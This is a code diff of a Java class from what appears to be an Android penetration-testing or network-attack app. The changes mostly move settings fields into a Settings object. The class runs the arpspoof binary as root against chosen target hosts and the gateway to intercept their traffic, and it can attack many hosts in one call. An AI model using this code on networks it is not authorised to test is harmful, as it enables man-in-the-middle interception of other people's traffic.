@@ -21,15 +21,15 @@ public class                        ArpSpoof {
     }
 
     public ArpSpoof                 start() {
-        if (Singleton.getInstance().DebugMode)
+        if (Singleton.getInstance().Settings.DebugMode)
             Log.d(TAG, "ARPSpooging Attacking " + mTarget.ip);
         new Thread(new Runnable() {
-            @Override
             public void run() {
                 mProcess = new RootProcess("ARPSPoof::" + mTarget.ip);
-                mProcess.exec(Singleton.getInstance().BinaryPath + "arpspoof -i wlan0 -t " + mTarget.ip + " " + Singleton.getInstance().network.gateway);
+
+                mProcess.exec(Singleton.getInstance().Settings.BinaryPath + "arpspoof -i wlan0 -t " + mTarget.ip + " " + Singleton.getInstance().network.gateway);
                 Singleton.getInstance().ArpSpoofProcessStack.add(mInstance);
-                if (Singleton.getInstance().DebugMode) {
+                if (Singleton.getInstance().Settings.DebugMode) {
                     BufferedReader reader = mProcess.getReader();
                     String read;
                     try {
@@ -46,7 +46,7 @@ public class                        ArpSpoof {
     }
 
     public static void              stopArpSpoof() {
-        if (Singleton.getInstance().DebugMode)
+        if (Singleton.getInstance().Settings.DebugMode)
             Log.d(TAG, "STOP ARPSpooging Attacking ");
         new Thread(new Runnable() {
             @Override
@@ -57,7 +57,7 @@ public class                        ArpSpoof {
                 String line;
                 try {
                     while ((line = reader.readLine()) != null) {
-                        if (line.contains("arp") && Singleton.getInstance().UltraDebugMode)
+                        if (line.contains("arp") && Singleton.getInstance().Settings.UltraDebugMode)
                             Log.d(TAG, line);
                         String pidArpProcess = line.replace("  ", " ").split(" ")[3];
                         new RootProcess("ARPSpoof").exec("kill SIGINT " + pidArpProcess).closeProcess();
@@ -72,6 +72,7 @@ public class                        ArpSpoof {
     }
 
     public static void              launchArpSpoof(List<Host> hosts) {
+        Log.d(TAG, "Arp spoofing " + hosts.size() + " targets");
         for (Host host : hosts) {
             new ArpSpoof(host).start();
         }
